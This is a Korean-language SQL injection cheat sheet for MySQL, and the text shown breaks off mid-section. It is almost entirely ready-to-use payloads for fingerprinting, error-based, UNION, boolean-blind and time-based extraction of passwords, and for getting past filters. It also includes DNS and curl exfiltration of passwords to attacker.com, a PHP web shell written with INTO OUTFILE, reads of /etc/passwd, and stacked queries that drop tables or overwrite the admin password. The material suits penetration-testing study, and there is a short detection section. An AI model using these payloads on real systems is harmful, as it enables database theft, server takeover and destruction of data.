# MySQL SQL Injection 완전 정복

> MySQL 전용 SQLi 기법 상세 문서
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [MySQL 기본 특성](#1-mysql-기본-특성)
2. [문자열 및 식별자 처리](#2-문자열-및-식별자-처리)
3. [주석 문법](#3-주석-문법)
4. [핵심 함수](#4-핵심-함수)
5. [시스템 테이블 (information_schema)](#5-시스템-테이블-information_schema)
6. [Error-based Injection](#6-error-based-injection)
7. [Union-based Injection](#7-union-based-injection)
8. [Boolean-based Blind](#8-boolean-based-blind)
9. [Time-based Blind](#9-time-based-blind)
10. [Out-of-band Techniques](#10-out-of-band-techniques)
11. [Stacked Queries](#11-stacked-queries)
12. [파일 작업](#12-파일-작업)
13. [MySQL 전용 우회 기법](#13-mysql-전용-우회-기법)
14. [버전별 차이점](#14-버전별-차이점)
15. [탐지 시그니처](#15-탐지-시그니처)
16. [치트시트](#16-치트시트)

---

## 1. MySQL 기본 특성

### 1.1 버전 정보

```
┌─────────────────────────────────────────────────────────────┐
│                    MySQL 주요 버전                          │
├──────────┬──────────────────────────────────────────────────┤
│  버전    │  특징                                           │
├──────────┼──────────────────────────────────────────────────┤
│  5.0     │  information_schema 도입                        │
│  5.1     │  이벤트 스케줄러, 파티셔닝                      │
│  5.5     │  InnoDB 기본 엔진, 반동기 복제                  │
│  5.6     │  전문 검색, memcached 플러그인                  │
│  5.7     │  JSON 지원, 가상 컬럼, sys 스키마               │
│  8.0     │  Window 함수, CTE, 역할(Role) 지원             │
└──────────┴──────────────────────────────────────────────────┘
```

### 1.2 기본 설정 확인

```sql
-- 버전 확인
SELECT VERSION();
SELECT @@version;
SELECT @@version_compile_os;

-- 현재 사용자
SELECT USER();
SELECT CURRENT_USER();
SELECT SESSION_USER();
SELECT SYSTEM_USER();

-- 현재 데이터베이스
SELECT DATABASE();
SELECT SCHEMA();

-- 호스트명
SELECT @@hostname;

-- 데이터 디렉토리
SELECT @@datadir;

-- 플러그인 디렉토리
SELECT @@plugin_dir;
```

### 1.3 권한 확인

```sql
-- 현재 사용자 권한
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- 특정 사용자 권한 (권한 필요)
SHOW GRANTS FOR 'user'@'host';

-- 권한 테이블 직접 조회
SELECT * FROM mysql.user;
SELECT * FROM information_schema.user_privileges;
```

---

## 2. 문자열 및 식별자 처리

### 2.1 문자열 리터럴

```sql
-- 기본 문자열 (단일 따옴표)
SELECT 'hello';

-- 이중 따옴표 (ANSI_QUOTES 모드 아닐 때)
SELECT "hello";

-- 이스케이프
SELECT 'it\'s';      -- 백슬래시 이스케이프
SELECT 'it''s';      -- 따옴표 두 번

-- Hex 문자열
SELECT 0x68656C6C6F;         -- 'hello'
SELECT X'68656C6C6F';        -- 'hello'
SELECT 0x61646D696E;         -- 'admin'

-- 바이너리 문자열
SELECT B'01100001';          -- 97 = 'a'
SELECT 0b01100001;           -- 97 = 'a'

-- National 문자열
SELECT N'hello';
SELECT n'hello';

-- Character Set 지정
SELECT _utf8'hello';
SELECT _latin1'hello';
SELECT _binary'hello';
```

### 2.2 문자열 연결 (MySQL 특수)

```sql
-- CONCAT 함수
SELECT CONCAT('hel', 'lo');           -- 'hello'
SELECT CONCAT('a', 'b', 'c', 'd');    -- 'abcd'

-- 공백으로 연결 (MySQL 전용!)
SELECT 'hel' 'lo';                    -- 'hello'
SELECT 'a' 'b' 'c';                   -- 'abc'

-- CONCAT_WS (구분자 포함)
SELECT CONCAT_WS(',', 'a', 'b', 'c'); -- 'a,b,c'

-- SQLi 활용
SELECT * FROM users WHERE name = 'adm' 'in';  -- 'admin'
```

### 2.3 식별자

```sql
-- 백틱으로 감싸기 (예약어 사용 가능)
SELECT * FROM `select`;
SELECT `column` FROM `table`;

-- 이중 따옴표 (ANSI_QUOTES 모드)
SELECT * FROM "select";

-- 예약어 우회
SELECT * FROM `users` WHERE `select` = 1;
```

### 2.4 NULL 처리

```sql
-- NULL 리터럴
SELECT NULL;
SELECT \N;

-- NULL 비교
SELECT * FROM users WHERE name IS NULL;
SELECT * FROM users WHERE name <=> NULL;  -- NULL-safe 비교
SELECT * FROM users WHERE ISNULL(name);
SELECT * FROM users WHERE IFNULL(name, 'default');
SELECT * FROM users WHERE COALESCE(name, 'default');
```

---

## 3. 주석 문법

### 3.1 기본 주석

```sql
-- 한 줄 주석 (더블 대시 + 공백 필수!)
SELECT * FROM users -- comment
SELECT * FROM users --+comment   -- + 로 공백 대체 가능

-- 해시 주석 (MySQL 전용)
SELECT * FROM users # comment
SELECT * FROM users #comment     -- 공백 불필요

-- 블록 주석
SELECT * FROM users /* comment */
SELECT /* comment */ * FROM users
SELECT * /* inline */ FROM users

-- 주석으로 공백 대체
SELECT/**/password/**/FROM/**/users
```

### 3.2 버전 조건부 주석 (MySQL 전용)

```sql
-- 문법: /*!version code*/
-- version = MySQL 버전 (5자리)

-- 모든 MySQL 버전에서 실행
SELECT /*!UNION*/ /*!SELECT*/ 1

-- 특정 버전 이상에서만 실행
/*!50000 SELECT * FROM users*/     -- MySQL 5.0.0 이상
/*!50700 JSON_EXTRACT(...)*/       -- MySQL 5.7.0 이상
/*!80000 WITH RECURSIVE ...*/      -- MySQL 8.0.0 이상

-- 버전 주석 활용 우회
SELECT * FROM users WHERE id = '1' /*!UNION*/ /*!SELECT*/ password /*!FROM*/ users--

-- 중첩 버전 주석
/*!50000 /*!40100 SELECT */ */
```

### 3.3 주석 우회 기법

```sql
-- 인라인 주석으로 키워드 분리
UN/**/ION SEL/**/ECT
UN/*anything here*/ION

-- 버전 주석으로 키워드 감싸기
/*!50000UNION*/
/*!50000SELECT*/
/*!50000UNION*//*!50000SELECT*/

-- 중첩 주석 (일부 파서)
/*! /*/ SELECT */
```

---

## 4. 핵심 함수

### 4.1 정보 수집 함수

```sql
-- 버전
VERSION()              -- 예: 5.7.32
@@version              -- 예: 5.7.32-log
@@version_compile_os   -- 예: Linux

-- 사용자
USER()                 -- 예: root@localhost
CURRENT_USER()         -- 예: root@localhost
SESSION_USER()         -- USER()와 동일
SYSTEM_USER()          -- USER()와 동일

-- 데이터베이스
DATABASE()             -- 현재 DB
SCHEMA()               -- DATABASE()와 동일

-- 기타
@@hostname             -- 호스트명
@@datadir              -- 데이터 디렉토리
@@basedir              -- MySQL 설치 디렉토리
CONNECTION_ID()        -- 연결 ID
LAST_INSERT_ID()       -- 마지막 AUTO_INCREMENT
```

### 4.2 문자열 함수

```sql
-- 연결
CONCAT('a', 'b')              -- 'ab'
CONCAT_WS('-', 'a', 'b')      -- 'a-b'
'a' 'b'                       -- 'ab' (MySQL 특수)

-- 추출
SUBSTRING('hello', 2, 3)      -- 'ell' (위치, 길이)
SUBSTR('hello', 2, 3)         -- 'ell'
MID('hello', 2, 3)            -- 'ell'
LEFT('hello', 2)              -- 'he'
RIGHT('hello', 2)             -- 'lo'

-- 위치
LOCATE('l', 'hello')          -- 3
POSITION('l' IN 'hello')      -- 3
INSTR('hello', 'l')           -- 3

-- 길이
LENGTH('hello')               -- 5 (바이트)
CHAR_LENGTH('hello')          -- 5 (문자)
BIT_LENGTH('hello')           -- 40 (비트)

-- 변환
UPPER('hello')                -- 'HELLO'
LOWER('HELLO')                -- 'hello'
REVERSE('hello')              -- 'olleh'
REPLACE('hello', 'l', 'x')    -- 'hexxo'
TRIM('  hello  ')             -- 'hello'
LPAD('hi', 5, '0')            -- '000hi'
RPAD('hi', 5, '0')            -- 'hi000'

-- ASCII 변환
ASCII('a')                    -- 97
ORD('a')                      -- 97
CHAR(97)                      -- 'a'
CHAR(97, 98, 99)              -- 'abc'
```

### 4.3 조건 함수

```sql
-- IF
IF(condition, true_value, false_value)
IF(1=1, 'yes', 'no')          -- 'yes'

-- CASE
CASE WHEN condition THEN result ELSE default END
CASE WHEN 1=1 THEN 'yes' ELSE 'no' END

-- IFNULL / NULLIF
IFNULL(null_value, 'default') -- NULL이면 default
NULLIF(a, b)                  -- a=b면 NULL, 아니면 a

-- COALESCE
COALESCE(NULL, NULL, 'value') -- 첫 번째 non-NULL 값
```

### 4.4 시간 지연 함수

```sql
-- SLEEP (권장)
SLEEP(5)                      -- 5초 지연
SELECT IF(1=1, SLEEP(5), 0)   -- 조건부 지연

-- BENCHMARK (CPU 집약)
BENCHMARK(10000000, SHA1('x'))
BENCHMARK(5000000, MD5('x'))

-- 무거운 쿼리 (대안)
SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B

-- SQLi 활용
' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--
```

### 4.5 비교 및 검색 함수

```sql
-- LIKE
'admin' LIKE 'adm%'           -- TRUE
'admin' LIKE '_dmin'          -- TRUE
'admin' LIKE '%m%'            -- TRUE

-- REGEXP / RLIKE
'admin' REGEXP '^a'           -- TRUE
'admin' RLIKE 'min$'          -- TRUE

-- 비교
STRCMP('a', 'b')              -- -1 (a < b)
FIELD('b', 'a', 'b', 'c')     -- 2 (위치)

-- 범위
5 BETWEEN 1 AND 10            -- TRUE
'b' IN ('a', 'b', 'c')        -- TRUE
```

### 4.6 수학 및 변환 함수

```sql
-- 수학
ABS(-5)                       -- 5
FLOOR(5.7)                    -- 5
CEIL(5.2)                     -- 6
ROUND(5.5)                    -- 6
RAND()                        -- 0~1 랜덤

-- 형변환
CAST('123' AS SIGNED)         -- 123
CONVERT('123', SIGNED)        -- 123
CAST(123 AS CHAR)             -- '123'

-- 인코딩
HEX('abc')                    -- '616263'
UNHEX('616263')               -- 'abc'
TO_BASE64('hello')            -- 'aGVsbG8='
FROM_BASE64('aGVsbG8=')       -- 'hello'
```

---

## 5. 시스템 테이블 (information_schema)

### 5.1 데이터베이스 목록

```sql
-- 모든 데이터베이스
SELECT schema_name FROM information_schema.schemata;

-- 축약
SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('mysql','information_schema','performance_schema','sys');

-- SHOW 명령
SHOW DATABASES;
```

### 5.2 테이블 목록

```sql
-- 특정 DB의 테이블
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'target_db';

-- 현재 DB의 테이블
SELECT table_name
FROM information_schema.tables
WHERE table_schema = DATABASE();

-- 모든 테이블 (DB.Table 형식)
SELECT CONCAT(table_schema, '.', table_name)
FROM information_schema.tables;

-- SHOW 명령
SHOW TABLES;
SHOW TABLES FROM database_name;
```

### 5.3 컬럼 목록

```sql
-- 특정 테이블의 컬럼
SELECT column_name
FROM information_schema.columns
WHERE table_schema = 'target_db'
AND table_name = 'users';

-- 컬럼 타입 포함
SELECT column_name, data_type, column_type
FROM information_schema.columns
WHERE table_name = 'users';

-- SHOW 명령
SHOW COLUMNS FROM users;
DESCRIBE users;
DESC users;
```

### 5.4 한 줄로 추출 (GROUP_CONCAT)

```sql
-- 모든 DB를 한 줄로
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
-- 결과: db1,db2,db3

-- 모든 테이블을 한 줄로
SELECT GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = DATABASE();

-- 모든 컬럼을 한 줄로
SELECT GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_name = 'users';

-- 구분자 변경
SELECT GROUP_CONCAT(column_name SEPARATOR '|')
FROM information_schema.columns
WHERE table_name = 'users';

-- 길이 제한 해제 (기본 1024)
SET SESSION group_concat_max_len = 1000000;
```

### 5.5 기타 유용한 시스템 테이블

```sql
-- 프로세스 목록
SELECT * FROM information_schema.processlist;

-- 사용자 권한
SELECT * FROM information_schema.user_privileges;

-- 변수
SELECT * FROM information_schema.global_variables;

-- MySQL 5.7+ sys 스키마
SELECT * FROM sys.version;
SELECT * FROM sys.user_summary;
```

---

## 6. Error-based Injection

### 6.1 EXTRACTVALUE (XML)

```sql
-- 문법: EXTRACTVALUE(xml_frag, xpath_expr)
-- XPath 에러 시 데이터 노출

-- 버전 추출
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--
-- 에러: "XPATH syntax error: '~5.7.32~'"

-- 사용자 추출
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER()), 0x7e))--
-- 에러: "XPATH syntax error: '~root@localhost~'"

-- 데이터 추출
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e))--

-- 한계: 32자 제한
-- 우회: SUBSTRING 사용
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 1, 32), 0x7e))--
```

### 6.2 UPDATEXML (XML)

```sql
-- 문법: UPDATEXML(xml_target, xpath_expr, new_value)
-- XPath 에러 시 데이터 노출

-- 버전 추출
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1)--

-- 사용자 추출
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT USER()), 0x7e), 1)--

-- 데이터 추출
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e), 1)--
```

### 6.3 FLOOR + RAND (Classic)

```sql
-- 문법: GROUP BY에서 중복 키 에러 유발
-- 원리: RAND(0) * 2 = 0 또는 1, FLOOR로 0/1 생성, 중복 시 에러

-- 버전 추출
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- 사용자 추출
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT USER()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- 데이터 추출
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- 에러 메시지 예:
-- "Duplicate entry 'admin_password1' for key 'group_key'"
```

### 6.4 EXP (숫자 오버플로우)

```sql
-- MySQL 5.5.5+ 에서 사용
-- 문법: EXP(710) 이상에서 오버플로우

-- 버전 추출
' AND EXP(~(SELECT * FROM (SELECT VERSION()) x))--

-- 데이터 추출
' AND EXP(~(SELECT * FROM (SELECT password FROM users LIMIT 1) x))--

-- 에러: "DOUBLE value is out of range"
```

### 6.5 BIGINT Overflow

```sql
-- 큰 숫자 연산으로 오버플로우

' AND !(SELECT * FROM (SELECT USER())x) - ~0--

-- 에러 메시지에 데이터 포함
```

### 6.6 NAME_CONST (중복 컬럼)

```sql
-- MySQL 5.0.12+
-- 동일한 NAME_CONST로 중복 컬럼명 에러

' AND (SELECT * FROM (SELECT NAME_CONST(VERSION(),1), NAME_CONST(VERSION(),1))x)--

-- 에러: "Duplicate column name '5.7.32'"
```

### 6.7 Error-based 한계 및 우회

```sql
-- 문자열 길이 제한 (보통 32자)
-- 해결: SUBSTRING 으로 분할 추출

-- 첫 32자
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(password) FROM users), 1, 32), 0x7e))--

-- 다음 32자
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(password) FROM users), 33, 32), 0x7e))--
```

---

## 7. Union-based Injection

### 7.1 컬럼 수 파악

```sql
-- ORDER BY 방식 (이진 탐색)
' ORDER BY 1--     (성공)
' ORDER BY 5--     (성공)
' ORDER BY 10--    (에러)
' ORDER BY 7--     (성공)
' ORDER BY 8--     (에러) → 컬럼 수 = 7

-- UNION SELECT NULL 방식
' UNION SELECT NULL--          (에러 = 1개 아님)
' UNION SELECT NULL,NULL--     (에러 = 2개 아님)
' UNION SELECT NULL,NULL,NULL-- (성공 = 3개)

-- GROUP BY 방식
' GROUP BY 1--
' GROUP BY 2--
' GROUP BY 3--     (에러 시 컬럼 수 = 2)
```

### 7.2 출력 위치 파악

```sql
-- 숫자로 확인
' UNION SELECT 1,2,3,4,5--
-- 화면에 출력되는 숫자 확인 (예: 2, 4가 보임)

-- 문자열로 확인
' UNION SELECT 'a','b','c','d','e'--

-- 위치 확인 후 해당 위치에 추출 쿼리 삽입
' UNION SELECT 1,VERSION(),3,USER(),5--
```

### 7.3 데이터 추출 단계

```sql
-- Step 1: 데이터베이스 목록
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--

-- Step 2: 테이블 목록
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'--

-- Step 3: 컬럼 목록
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Step 4: 데이터 추출
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
-- 결과: admin:hash1,user1:hash2,user2:hash3
```

### 7.4 데이터 타입 문제 해결

```sql
-- 숫자 컬럼에 문자열 삽입 시 에러
-- 해결: CAST 또는 숫자+문자열 변환

' UNION SELECT 1,2,CAST(username AS CHAR),4 FROM users--

-- 또는 숫자로 변환
' UNION SELECT 1,2,ORD(SUBSTRING(username,1,1)),4 FROM users--
```

### 7.5 LIMIT 활용

```sql
-- 한 행씩 추출
' UNION SELECT 1,password,3 FROM users LIMIT 0,1--  (첫 번째)
' UNION SELECT 1,password,3 FROM users LIMIT 1,1--  (두 번째)
' UNION SELECT 1,password,3 FROM users LIMIT 2,1--  (세 번째)

-- OFFSET 문법
' UNION SELECT 1,password,3 FROM users LIMIT 1 OFFSET 0--
```

---

## 8. Boolean-based Blind

### 8.1 기본 원리

```sql
-- 참 조건 (정상 응답)
' AND 1=1--
' AND 'a'='a'--
' AND TRUE--

-- 거짓 조건 (다른 응답)
' AND 1=2--
' AND 'a'='b'--
' AND FALSE--

-- 응답 차이로 한 비트씩 정보 추출
```

### 8.2 데이터 추출 기법

```sql
-- 문자 비교
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
...

-- ASCII 이진 탐색 (더 효율적)
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 64--
-- 참이면 65~127, 거짓이면 0~64
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 96--
-- 참이면 97~127 (소문자 범위)

-- ORD 사용 (ASCII와 동일)
' AND ORD(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 96--
```

### 8.3 문자열 길이 확인

```sql
-- 길이 확인
' AND LENGTH((SELECT username FROM users LIMIT 1)) > 5--
' AND LENGTH((SELECT username FROM users LIMIT 1)) = 5--

-- CHAR_LENGTH (멀티바이트)
' AND CHAR_LENGTH((SELECT username FROM users LIMIT 1)) = 5--
```

### 8.4 행 수 확인

```sql
-- 테이블 행 수
' AND (SELECT COUNT(*) FROM users) > 10--
' AND (SELECT COUNT(*) FROM users) = 15--
```

### 8.5 REGEXP 활용

```sql
-- 정규식으로 추출 (패턴 매칭)
' AND (SELECT username FROM users LIMIT 1) REGEXP '^a'--   -- a로 시작?
' AND (SELECT username FROM users LIMIT 1) REGEXP '^ad'--  -- ad로 시작?
' AND (SELECT username FROM users LIMIT 1) REGEXP '^adm'-- -- adm로 시작?

-- LIKE 활용
' AND (SELECT username FROM users LIMIT 1) LIKE 'a%'--
' AND (SELECT username FROM users LIMIT 1) LIKE 'ad%'--
```

### 8.6 비트 연산 활용

```sql
-- 비트 단위 추출 (더 정밀)
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 128) = 128--
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 64) = 64--
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 32) = 32--
...
-- 7비트 확인으로 한 문자 확정
```

---

## 9. Time-based Blind

### 9.1 SLEEP 기반

```sql
-- 기본 SLEEP
' AND SLEEP(5)--
-- 5초 지연되면 SQLi 존재

-- 조건부 SLEEP
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(1=2, SLEEP(5), 0)--  (지연 없음)

-- 데이터 추출
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--
-- 5초 지연되면 첫 글자가 'a'

-- ASCII 이진 탐색
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96, SLEEP(5), 0)--
```

### 9.2 BENCHMARK 기반

```sql
-- BENCHMARK: 표현식을 N번 반복 실행
-- SLEEP이 차단된 경우 대안

' AND BENCHMARK(10000000, SHA1('test'))--
-- 약 3-5초 지연

-- 조건부 BENCHMARK
' AND IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)--

-- 데이터 추출
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', BENCHMARK(10000000, MD5('x')), 0)--
```

### 9.3 무거운 쿼리 기반

```sql
-- SLEEP, BENCHMARK 모두 차단 시

-- 대량 조인
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) > 0 AND 1=1--

-- 조건부
' AND IF(1=1, (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B), 0)--
```

### 9.4 시간 측정 주의사항

```
1. 네트워크 지연 고려
   - 정상 응답 시간 먼저 측정
   - 충분한 지연 시간 설정 (5초 권장)

2. 여러 번 확인
   - 한 번의 지연은 우연일 수 있음
   - 동일 조건 2-3회 확인

3. 타임아웃 설정
   - 서버 타임아웃보다 짧게 설정
   - 연결 끊김 방지
```

---

## 10. Out-of-band Techniques

### 10.1 DNS Exfiltration

```sql
-- LOAD_FILE + DNS
-- 조건: FILE 권한 필요

' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--

-- 결과: password123.attacker.com 으로 DNS 쿼리 발생
-- 공격자 DNS 서버에서 password 확인

-- INTO OUTFILE + DNS (Windows UNC)
' UNION SELECT 1,2,3 INTO OUTFILE '\\\\' + (SELECT password FROM users) + '.attacker.com\\a'--
```

### 10.2 HTTP Exfiltration

```sql
-- MySQL은 기본적으로 HTTP 지원 안 함
-- 하지만 다음 방법들 가능:

-- 1. User Defined Function (UDF)
-- lib_mysqludf_sys 로드 시
SELECT sys_eval('curl http://attacker.com/?data=' || (SELECT password FROM users));

-- 2. 파일 쓰기 + 외부 접근
-- 웹 디렉토리에 파일 생성 후 HTTP로 접근
' UNION SELECT password FROM users INTO OUTFILE '/var/www/html/data.txt'--
```

### 10.3 제약 사항

```
DNS/HTTP Out-of-band 조건:
1. FILE 권한 필요
2. secure_file_priv 설정 확인
3. DB 서버가 외부 네트워크 접근 가능
4. Windows에서 UNC 경로 사용 가능

확인:
SELECT @@secure_file_priv;
-- NULL: 비활성화
-- 빈 문자열: 모든 경로 허용
-- 경로: 해당 경로만 허용
```

---

## 11. Stacked Queries

### 11.1 지원 조건

```
MySQL에서 Stacked Queries:
- 기본적으로 미지원
- mysqli_multi_query() 사용 시에만 가능
- PDO의 경우 설정에 따라 다름

대부분의 PHP 앱에서는 불가능
```

### 11.2 가능한 경우

```sql
-- mysqli_multi_query() 사용 시
'; DROP TABLE users;--
'; INSERT INTO users VALUES ('hacker', 'password');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
```

### 11.3 확인 방법

```sql
-- 시간 기반으로 확인
'; SELECT SLEEP(5);--

-- 테이블 생성 시도
'; CREATE TABLE test(id INT);--
-- 에러 메시지로 확인
```

---

## 12. 파일 작업

### 12.1 파일 읽기 (LOAD_FILE)

```sql
-- 조건:
-- 1. FILE 권한
-- 2. secure_file_priv 허용
-- 3. 파일 읽기 권한

-- 기본 사용
SELECT LOAD_FILE('/etc/passwd');

-- SQLi에서
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

-- Windows
' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),2,3--

-- Hex로 경로 지정 (필터 우회)
' UNION SELECT LOAD_FILE(0x2F6574632F706173737764),2,3--
-- 0x2F6574632F706173737764 = '/etc/passwd'
```

### 12.2 파일 쓰기 (INTO OUTFILE)

```sql
-- 조건:
-- 1. FILE 권한
-- 2. secure_file_priv 허용
-- 3. 디렉토리 쓰기 권한
-- 4. 파일이 존재하지 않아야 함

-- 기본 사용
SELECT 'content' INTO OUTFILE '/tmp/test.txt';

-- SQLi에서 웹쉘 생성
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- 데이터 추출
' UNION SELECT password FROM users INTO OUTFILE '/tmp/passwords.txt'--

-- DUMPFILE (바이너리 파일용)
' UNION SELECT password FROM users INTO DUMPFILE '/tmp/data.bin'--
```

### 12.3 secure_file_priv 우회

```sql
-- 확인
SELECT @@secure_file_priv;

-- 빈 문자열이면 모든 경로 허용
-- 특정 경로면 해당 경로만 사용 가능
-- NULL이면 완전히 비활성화 (우회 불가)

-- 허용된 경로 내에서 작업
' UNION SELECT password INTO OUTFILE '/var/lib/mysql-files/data.txt'--
```

---

## 13. MySQL 전용 우회 기법

### 13.1 버전 주석 활용

```sql
-- 기본 우회
/*!UNION*/ /*!SELECT*/ password FROM users

-- 버전 지정
/*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ users

-- 전체 감싸기
/*!50000 UNION SELECT password FROM users */
```

### 13.2 공백 대체

```sql
-- MySQL에서 사용 가능한 공백 문자
%09  Tab
%0A  Line Feed (LF)
%0B  Vertical Tab
%0C  Form Feed
%0D  Carriage Return (CR)
%A0  Non-breaking Space

-- 예시
UNION%0ASELECT%0Apassword%0AFROM%0Ausers
UNION%09SELECT%09password%09FROM%09users

-- 주석으로 공백
UNION/**/SELECT/**/password/**/FROM/**/users

-- 괄호로 공백 제거
UNION(SELECT(password)FROM(users))
```

### 13.3 HANDLER 문 (SELECT 대체)

```sql
-- SELECT 없이 데이터 읽기
HANDLER users OPEN;
HANDLER users READ FIRST;
HANDLER users READ NEXT;
HANDLER users CLOSE;

-- SQLi 활용
'; HANDLER users OPEN; HANDLER users READ FIRST;--
```

### 13.4 산술 연산 우회

```sql
-- 숫자 필드에서
WHERE id = 1+0
WHERE id = 2-1
WHERE id = 1*1
WHERE id = 2 DIV 2
WHERE id = 1 MOD 2
WHERE id = 1 & 1
WHERE id = 1 | 0
WHERE id = 1 ^ 0
```

### 13.5 문자열 비교 우회

```sql
-- 같음 비교 대체
WHERE name = 'admin'
WHERE name LIKE 'admin'
WHERE name REGEXP '^admin$'
WHERE name RLIKE '^admin$'
WHERE name IN ('admin')
WHERE name BETWEEN 'admin' AND 'admin'
WHERE STRCMP(name, 'admin') = 0
WHERE name <=> 'admin'  -- NULL-safe
```

---

## 14. 버전별 차이점

### 14.1 MySQL 5.0 vs 5.x

```sql
-- MySQL 5.0+: information_schema 사용 가능
SELECT * FROM information_schema.tables;

-- MySQL 4.x: information_schema 없음
-- 테이블명 추측 필요
SELECT * FROM users;  -- 직접 시도
```

### 14.2 MySQL 5.7+

```sql
-- sys 스키마 추가
SELECT * FROM sys.version;
SELECT * FROM sys.user_summary;

-- JSON 지원
SELECT JSON_EXTRACT('{"name":"admin"}', '$.name');

-- Generated Columns
-- 가상 컬럼 활용 가능
```

### 14.3 MySQL 8.0+

```sql
-- CTE (Common Table Expression)
WITH RECURSIVE cte AS (
  SELECT 1 AS n
  UNION ALL
  SELECT n+1 FROM cte WHERE n < 10
)
SELECT * FROM cte;

-- Window Functions
SELECT *, ROW_NUMBER() OVER (ORDER BY id) FROM users;

-- 역할(Role) 기반 권한
-- 권한 체계 변경

-- caching_sha2_password 기본 인증
-- 연결 방식 차이
```

---

## 15. 탐지 시그니처

### 15.1 에러 메시지 패턴

```yaml
mysql_error_patterns:
  - pattern: "You have an error in your SQL syntax"
    confidence: 0.95
    indicates: "MySQL 문법 에러"

  - pattern: "mysql_fetch_array()"
    confidence: 0.99
    indicates: "PHP mysql_* 확장 (레거시)"

  - pattern: "mysql_num_rows()"
    confidence: 0.99
    indicates: "PHP mysql_* 확장"

  - pattern: "Warning: mysql_"
    confidence: 0.95
    indicates: "PHP MySQL 경고"

  - pattern: "MySQLSyntaxErrorException"
    confidence: 0.95
    indicates: "Java MySQL 드라이버"

  - pattern: "com.mysql.jdbc"
    confidence: 0.90
    indicates: "Java MySQL Connector"

  - pattern: "SQLSTATE[42000]"
    confidence: 0.85
    indicates: "PDO MySQL"

  - pattern: "Unknown column"
    confidence: 0.90
    indicates: "MySQL 컬럼 에러"

  - pattern: "Table .* doesn't exist"
    confidence: 0.90
    indicates: "MySQL 테이블 에러"

  - pattern: "XPATH syntax error"
    confidence: 0.95
    indicates: "MySQL XML 함수 에러"

  - pattern: "Duplicate entry .* for key"
    confidence: 0.90
    indicates: "MySQL 중복 키 에러"
```

### 15.2 DBMS 확인 페이로드

```sql
-- 에러 유발 (문법 특성 확인)
' AND 'a'='a     -- 모든 DB
' AND 1=1#       -- MySQL (# 주석)
'/*!50000*/     -- MySQL (버전 주석)

-- 함수 기반 확인
' AND CONNECTION_ID()>0--    -- MySQL
' AND @@version LIKE '%'--   -- MySQL
' AND VERSION() LIKE '%'--   -- MySQL

-- 시스템 테이블 확인
' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1--
```

---

## 16. 치트시트

### 16.1 정보 수집 원라이너

```sql
-- 버전
' UNION SELECT VERSION(),2,3--
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--

-- 사용자
' UNION SELECT USER(),2,3--
' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--

-- 데이터베이스
' UNION SELECT DATABASE(),2,3--
' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--

-- 모든 DB
' UNION SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata--

-- 모든 테이블
